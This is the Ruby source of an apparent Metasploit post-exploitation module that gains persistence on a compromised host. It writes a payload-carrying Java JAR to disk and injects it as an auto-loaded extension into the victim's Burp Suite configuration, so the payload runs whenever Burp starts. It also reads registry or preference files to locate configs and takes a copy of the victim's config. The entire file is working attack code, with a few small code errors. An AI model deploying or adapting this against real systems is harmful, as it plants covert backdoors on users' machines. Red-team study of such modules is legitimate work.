##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
#
require 'open3'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix # whoami
  include Msf::Auxiliary::Report
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Burp Extension Persistence',
        'Description' => %q{
          This module adds a java based malicious extension to the Burp Suite configuration file.
          When burp is opened, the extension will be loaded and the payload will be executed.

          Tested against Burp Suite Community Edition v2024.9.4, v2024.10.3 on Kali.
          Tested against Burp Suite Professional ??? on Kali.
          Tested against Burp Suite Community Edition v2024.10.3 on Windows 10.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # Module
        ],
        'DisclosureDate' => '2025-01-01',
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Privileged' => false,
        'References' => [
          [ 'URL', 'https://portswigger.net/burp/documentation/desktop/extensions/creating' ],
          [ 'URL', 'https://portswigger.net/burp/documentation/desktop/troubleshooting/launch-from-command-line' ]
        ],
        'DefaultOptions' => {
          # 25hrs, you know, just in case the user doesn't open Burp for a while
          # 'WfsDelay' => 90_000,
          'PrependMigrate' => true
        },
        'Payload' => {
          'BadChars' => '";\\'
        },
        'Stance' => Msf::Exploit::Stance::Passive,
        'Passive' => true,
        'Targets' => [
          [
            'Java', {
              'Platform' => 'java', 'Arch' => [ARCH_JAVA]
            }
          ],
          ['Linux', { 'Platform' => 'unix', 'Arch' => [ARCH_CMD] } ],
          [
            'Windows', { 'Platform' => 'windows', 'Arch' => [ARCH_CMD] }, {
              'Payload' =>
                              { 'Space' => 8_191 - 'cmd.exe /c '.length }
            }
          ],
        ],
        'Actions' => [
          ['precompiled', { 'Description' => 'Use pre-compiled bytecode' }],
          ['build', { 'Description' => 'Build the extension locally with Gradle' }]
        ],
        'DefaultAction' => 'precompiled',
        'Notes' => {
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, CONFIG_CHANGES ]
        },
        'DefaultTarget' => 0
      )
    )

    register_options([
      OptString.new('NAME', [ false, 'Name of the extension', '' ]),
      OptString.new('CONFIG', [ false, 'Config file location on target', '' ]),
      OptString.new('WritableDir', [ true, 'A directory where we can write the extension']),
      OptString.new('USER', [ false, 'User to target, or current user if blank', '' ]),
    ])
    register_advanced_options([
      OptString.new('GRADLE', [ false, 'Local Gradle executable', '/usr/bin/gradle' ]),
    ])
  end

  def extension_name_generator
    return datastore['NAME'] unless datastore['NAME'].blank?

    rand_text_alphanumeric(4..10)
  end

  def check
    if action.name == 'build'
      if File.exist?(datastore['GRADLE'])
        vprint_good('Gradle found')
      else
        print_warning('Gradle is required on the local computer running metasploit, please install it or use precompiled action')
      end
    end

    configs = get_configs_from_settings
    configs.each do |config|
      if file?(config)
        print_status("Found config: #{config}")
      else
        print_status("Config mentioned in settings, but not found: #{config}")
      end
    end

    print_bad('User has no saved configs in their settings') if configs.empty?

    if datastore['config'].blank?
      return CheckCode::Detected('No config file listed, only writing plugin to disk')
    elsif file?(datastore['config'])
      return CheckCode::Detected("Config file found: #{datastore['config']}")
    end

    CheckCode::Safe("Config file not found: #{datastore['config']}")
  end

  def add_extension(settings_file, extension_location, extension_name)
    # open file
    config_contents = read_file(settings_file)
    # store as loot for backup purposes
    path = store_loot('burp.config.json', 'application/json', session, config_contents, nil, nil)
    print_good("Config file saved in: #{path}")
    # read json
    begin
      config_contents = JSON.parse(config_contents)
    rescue JSON::ParserError
      fail_with(Failure::Unknown, "Failed to parse json config file: #{settings_file}")
    end
    malicious_extension = {
      'errors' => 'ui',
      'extension_file' => extension_location,
      'extension_type' => 'java',
      'loaded' => true,
      'name' => extension_name,
      'output' => 'ui'
    }
    begin
      config_contents['user_options']['extender']['extensions'] << malicious_extension
    rescue NoMethodError
      fail_with(Failure::NotFound, "Failed to find 'user_options' in config file: #{settings_file}, likely a project settings file, not a user one.")
    end
    # write json
    write_file(settings_file, JSON.pretty_generate(config_contents, { 'space' => '', 'indent' => ' ' * 4 }))
  end

  def target_user
    return datastore['USER'] unless datastore['USER'].blank?

    return cmd_exec('cmd.exe /c echo %USERNAME%').strip if ['windows', 'win'].include? session.platform

    whoami
  end

  # windows stores these settings in the registry
  # *nix stores them in a prefs.xml file
  def get_configs_from_settings
    me = target_user
    config_files = []
    if ['windows', 'win'].include? session.platform
      key = 'HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\burp'
      for i in 0..100 # place a hard upper limit just in case
        value = registry_getvaldata(key, "free.suite.recent/Config/Files#{i}")

        break if value.nil?

        value = value.sub(%r{^/}, '') # remove leading slash. Example entry: /C:///Users//windows///Desktop//burp_user_settings.json
        config_files << value
      end
    else
      [
        "/home/#{me}/.java/.userPrefs/burp/prefs.xml",
        "/home/#{me}/.java/.userPrefs/burp/community/prefs.xml"
      ].each do |f|
        next unless file?(f)

        vprint_status("Found config file: #{f}")
        xml_content = read_file(f) # Replace with the path to your XML file

        doc = Nokogiri::XML(xml_content)

        # Extract entries from <map> where key starts with 'free.suite.recentConfigFiles'
        # its an array so free.suite.recentConfigFiles1, free.suite.recentConfigFiles2, etc
        entries = doc.xpath('//map/entry').select do |entry|
          entry['key']&.start_with?('free.suite.recentConfigFiles')
        end

        # Get the values for those entries
        entries.each do |entry|
          config_files << entry['value']
        end
      end
    end
    config_files
  end

  def run_local_gradle_build(extension_name)
    # Check if gradle is installed
    fails_with(Failure::NotFound, 'Gradle is not installed on the local system.') unless File.exist?(datastore['GRADLE'])

    # Define source and destination directories
    src_dir = File.join(Msf::Config.data_directory, 'exploits', 'burp_extension')
    temp_dir = Dir.mktmpdir

    # Copy necessary files to the temporary directory
    FileUtils.cp_r(File.join(src_dir, 'src'), temp_dir)
    FileUtils.cp(File.join(src_dir, 'settings.gradle'), temp_dir)
    FileUtils.cp(File.join(src_dir, 'build.gradle'), temp_dir)

    # Modify name.txt with the new extension name
    java_file = File.join(temp_dir, 'src', 'main', 'resources', 'name.txt')
    File.open(java_file, 'wb') { |file| file.puts extension_name }

    if target.name == 'Java'
      # delete the /src/main/resources/command.txt file copied over in the cp_r as its not needed
      File.delete(File.join(temp_dir, 'src', 'main', 'resources', 'command.txt'))
      java_file = File.join(temp_dir, 'src', 'main', 'resources', 'burp_extension_pload.jar')
      payload_jar = generate_payload.encoded_jar(main_class: 'burp_extension_pload')
      File.open(java_file, 'wb') { |file| file.puts payload_jar.pack }
    else
      # Modify command.txt where we put our payload command
      java_file = File.join(temp_dir, 'src', 'main', 'resources', 'command.txt')
      File.open(java_file, 'wb') { |file| file.puts payload.encoded }
    end

    # Run gradle clean build
    vprint_status("Building Burp extension jar file locally in #{temp_dir}")
    Dir.chdir(temp_dir) do
      IO.popen([datastore['GRADLE'], 'clean', 'build']) do |stdout|
        stdout.each_line { |line| vprint_line line }
      end
    end

    # Check if the jar file was created
    jar_file = File.join(temp_dir, 'build', 'libs', 'MetasploitPayloadExtension.jar')
    fail_with(Failure::NotFound, 'Failed to build burp extension') unless File.exist?(jar_file)
    print_good("Successfully built the jar file #{jar_file}")

    File.read(jar_file)
  end

  def compiled_extension(extension_name)
    # see data/exploits/burp_extension/notes.txt on how to get this content
    burp_extension_class = File.read(File.join(
      Msf::Config.data_directory, 'exploits', 'burp_extension', 'precompiled.class'
    ))

    jar = Rex::Zip::Jar.new
    # build our manifest manually because its only one line and we don't need the extra
    # ones that metasploit's build_manifest adds. This more closely implements the gradle build command
    jar.add_file('META-INF/', '')
    jar.add_file('META-INF/MANIFEST.MF', "Manifest-Version: 1.0\r\n\r\n")
    jar.add_file('burp/', '')
    jar.add_file('burp/BurpExtender.class', burp_extension_class)
    jar.add_file('command.txt', payload.encoded)
    jar.add_file('name.txt', extension_name)

    jar
  end

  def exploit
    # RuntimeError `writable?' method does not support Windows systems
    if !['windows', 'win'].include?(session.platform) && !writable?(datastore['WritableDir'])
      fail_with(Failure::NotFound, "Unable to write to WritableDir: #{datastore['WritableDir']}")
    end
    extension_name = extension_name_generator
    print_status("Using extension name: #{extension_name}")
    extension_location = "#{datastore['WritableDir']}/#{extension_name}.jar"
    vprint_status('Creating JAR file')

    case action.name
    when 'build'
      jar = run_local_gradle_build(extension_name)
    when 'precompiled'
      jar = compiled_extension(extension_name)
    end

    vprint_status("Writing malcious extension to disk: #{extension_location}")

    write_file(extension_location, jar)
    if datastore['CONFIG'].blank?
      print_good('Extension enabled, waiting for Burp to open with the config.')
    else
      vprint_status('Updating config file')
      add_extension(datastore['CONFIG'], extension_location, extension_name)
      print_good('Extension written to disk, waiting for Burp to open and user to install extension.')
    end

    # stolen from exploit/multi/handler
    stime = Time.now.to_f
    timeout = datastore['ListenerTimeout'].to_i
    loop do
      break if timeout > 0 && (stime + timeout < Time.now.to_f)

      Rex::ThreadSafe.sleep(1)
    end

    # config files must be applied, and on boot doesn't seem to work
    # /usr/lib/jvm/java-23-openjdk-amd64/bin/java -jar -Xmx4g -Djava.awt.headless=true /usr/share/burpsuite/burpsuite.jar burp.StartBurp --user-config-file=/tmp/burp.json &
  end
end
